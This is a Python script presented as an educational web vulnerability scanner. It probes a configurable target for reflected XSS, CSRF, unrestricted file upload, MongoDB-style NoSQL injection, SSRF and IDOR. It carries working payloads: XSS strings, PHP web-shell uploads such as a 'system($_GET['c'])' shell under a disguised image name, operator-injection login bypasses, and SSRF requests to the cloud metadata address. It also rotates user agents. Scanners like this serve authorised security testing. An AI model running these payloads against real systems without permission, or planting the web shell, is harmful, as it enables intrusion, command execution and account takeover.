#!/usr/bin/env python3
"""
Sequential Web Vulnerability Scanner - Single File
Tests: XSS, CSRF, File Upload, NoSQLi, SSRF, basic IDOR

WARNING:
- For EDUCATIONAL & AUTHORIZED TESTING ONLY!
- Use ONLY on targets you own or have explicit written permission to test
- Many checks are very basic / surface-level
- High chance of false negatives and some false positives

for some test need login credentials 
"""

import requests
import json
import time
import random
import re
from urllib.parse import urljoin, urlencode

# ─── CONFIGURATION ───────────────────────────────────────────────────────────────
BASE_URL = "http://localhost"           # ← CHANGE THIS
LOGIN_URL = "/login"                     # relative path
PROFILE_URL = "/profile"                 # self profile
PROFILE_ID_URL = "/profile/{}"           # profile by id
UPLOAD_URL = "/upload"                   # file upload endpoint
ACTION_URL = "/change-email"             # csrf testable action

TEST_EMAIL    = "testuser@example.com"
TEST_PASSWORD = "Password123!"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
]

TIMEOUT = 12
SLEEP_BETWEEN_TESTS = (1.2, 3.8)

# ─── HELPERS ─────────────────────────────────────────────────────────────────────

def random_headers():
    return {"User-Agent": random.choice(USER_AGENTS)}

def log(status, msg):
    color = {
        "INFO":    "\033[94m",
        "OK":      "\033[92m",
        "WARN":    "\033[93m",
        "DANGER":  "\033[91m",
        "RESET":   "\033[0m"
    }
    print(f"{color.get(status, '')}[{status}] {msg}{color['RESET']}")

# ─── TEST FUNCTIONS ──────────────────────────────────────────────────────────────

def test_reflected_xss(session, base):
    log("INFO", "Testing Reflected / DOM XSS...")
    payloads = [
        "<script>alert(1337)</script>",
        "\"><script>alert(1337)</script>",
        "<img src=x onerror=alert(1337)>",
        "javascript:alert(1337)",
        "'-alert(1337)-'",
        "<svg onload=alert(1337)>",
    ]

    vulnerable = False
    for payload in payloads:
        url = f"{base}?q={payload}&search={payload}"
        try:
            r = session.get(url, headers=random_headers(), timeout=TIMEOUT)
            if any(p.lower() in r.text.lower() for p in ["alert(1337)", "onerror=alert", "onload=alert"]):
                log("DANGER", f"Possible XSS → {payload[:40]}...")
                vulnerable = True
                break
            time.sleep(random.uniform(*SLEEP_BETWEEN_TESTS))
        except Exception as e:
            log("WARN", f"XSS request failed: {e}")

    return vulnerable


def test_csrf(session, base):
    log("INFO", "Testing basic CSRF protection...")

    # 1. Try to get some form/token (very naive)
    try:
        r = session.get(base, headers=random_headers(), timeout=TIMEOUT)
        token = re.search(r'name=["\']?_?csrf_?token["\']?\s+value=["\']([^"\']+)["\']', r.text, re.I)
        csrf_token = token.group(1) if token else None
    except:
        csrf_token = None

    data = {"email": "hacked@example.com"}

    # Without token
    try:
        r = session.post(urljoin(base, ACTION_URL), data=data, headers=random_headers(), timeout=TIMEOUT)
        if r.status_code in (200, 201, 302) and "success" in r.text.lower():
            log("DANGER", "CSRF - Action succeeded WITHOUT token!")
            return True
    except:
        pass

    # With wrong token
    if csrf_token:
        wrong_data = {**data, "csrf_token": csrf_token + "WRONG"}
        try:
            r = session.post(urljoin(base, ACTION_URL), data=wrong_data, headers=random_headers(), timeout=TIMEOUT)
            if r.status_code in (200, 201, 302) and "success" in r.text.lower():
                log("DANGER", "CSRF - Action succeeded WITH invalid token!")
                return True
        except:
            pass

    log("OK", "CSRF seems to be present (or action requires auth)")
    return False


def test_file_upload(session, base):
    log("INFO", "Testing unrestricted file upload...")

    malicious = [
        ("webshell.php",     "<?php echo 'SHELL OK'; ?>",            "text/plain"),
        ("photo.jpg.php",    "<?php system($_GET['c']); ?>",         "image/jpeg"),
        ("photo.jpg%00.php", "<?php echo 'null byte?'; ?>",          "image/jpeg"),
    ]

    url = urljoin(base, UPLOAD_URL)

    for name, content, mime in malicious:
        files = {"file": (name, content, mime)}
        try:
            r = session.post(url, files=files, headers=random_headers(), timeout=TIMEOUT)
            if r.status_code in (200, 201) and any(x in r.text.lower() for x in ["success", "uploaded", name.lower()]):
                log("DANGER", f"File upload possible! → {name}")
                return True
            time.sleep(random.uniform(*SLEEP_BETWEEN_TESTS))
        except Exception as e:
            log("WARN", f"Upload failed: {e}")

    return False


def test_nosql_injection(session, base):
    log("INFO", "Testing basic NoSQL injection (MongoDB style)...")

    payloads = [
        {"$ne": None},
        {"$gt": ""},
        {"username": {"$regex": "^admin", "$options": "i"}},
        {"$or": [{"username": "admin"}, {"1": "1"}]},
    ]

    url = urljoin(base, LOGIN_URL)

    for p in payloads:
        data = {"username": p, "password": "anything"}
        try:
            r = session.post(url, json=data, headers=random_headers(), timeout=TIMEOUT)
            if "welcome" in r.text.lower() or "logged" in r.text.lower() or r.status_code == 302:
                log("DANGER", f"Possible NoSQLi → {json.dumps(p, separators=(',',':'))[:60]}...")
                return True
        except:
            pass
        time.sleep(random.uniform(*SLEEP_BETWEEN_TESTS))

    return False


def test_ssrf(session, base):
    log("INFO", "Testing SSRF (very basic)...")

    payloads = [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]",
    ]

    vulnerable = False
    for p in payloads:
        params = {"url": p, "callback": p, "redirect": p, "image": p}
        for k, v in params.items():
            try:
                r = session.get(f"{base}?{k}={v}", headers=random_headers(), timeout=TIMEOUT)
                if any(x in r.text for x in ["instance-id", "ami-id", "metadata", "root:", "127.0.0.1"]):
                    log("DANGER", f"Possible SSRF → {k}={v}")
                    vulnerable = True
                    break
            except:
                pass
        if vulnerable:
            break
        time.sleep(random.uniform(*SLEEP_BETWEEN_TESTS))

    return vulnerable


def test_basic_idor(session, base, token=None):
    log("INFO", "Testing very basic IDOR (1..20)...")

    if not token:
        log("WARN", "No auth token → skipping IDOR test")
        return False

    headers = {"Authorization": f"Bearer {token}", **random_headers()}

    for i in range(1, 21):
        try:
            r = session.get(urljoin(base, PROFILE_ID_URL.format(i)), headers=headers, timeout=TIMEOUT)
            if r.status_code == 200 and len(r.text.strip()) > 20:
                log("WARN", f"Possible IDOR → profile/{i} returned data")
                return True
        except:
            pass
        time.sleep(0.4)

    return False


def try_login(session, base):
    url = urljoin(base, LOGIN_URL)
    data = {"email": TEST_EMAIL, "password": TEST_PASSWORD}
    try:
        r = session.post(url, json=data, headers=random_headers(), timeout=TIMEOUT)
        if r.status_code in (200, 201):
            token = r.json().get("token") or r.json().get("access_token")
            if token:
                log("OK", "Login successful → got token")
                return token
    except:
        pass
    log("WARN", "Login failed → many tests will be less effective")
    return None


# ─── MAIN FLOW ───────────────────────────────────────────────────────────────────

def main():
    print("="*70)
    print("   Sequential Web Vuln Scanner  -  Educational / Authorized Use Only")
    print("="*70)
    print(f"Target : {BASE_URL}")
    print("Start  : now\n")

    if not BASE_URL.startswith(("http://", "https://")):
        print("Please provide full URL (http:// or https://)")
        return

    session = requests.Session()

    # 1. Try to get authenticated context
    token = try_login(session, BASE_URL)

    tests = [
        ("Reflected XSS",       lambda: test_reflected_xss(session, BASE_URL)),
        ("CSRF protection",     lambda: test_csrf(session, BASE_URL)),
        ("File Upload",         lambda: test_file_upload(session, BASE_URL)),
        ("NoSQL Injection",     lambda: test_nosql_injection(session, BASE_URL)),
        ("SSRF",                lambda: test_ssrf(session, BASE_URL)),
        ("Basic IDOR",          lambda: test_basic_idor(session, BASE_URL, token)),
    ]

    for name, func in tests:
        print("\n" + "─"*60)
        print(f"→ Running: {name}")
        print("─"*60)
        vulnerable = func()
        print(f"  → Result: {'VULNERABLE' if vulnerable else 'Seems OK'}")
        time.sleep(1.5)

    print("\n" + "="*70)
    print("Scan finished. Remember:")
    print("• This is VERY SURFACE LEVEL testing")
    print("• Many vulns require manual verification")
    print("• False negatives are very common")
    print("• Use professional tools + source review for real assessments")
    print("="*70)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nScan interrupted by user.")
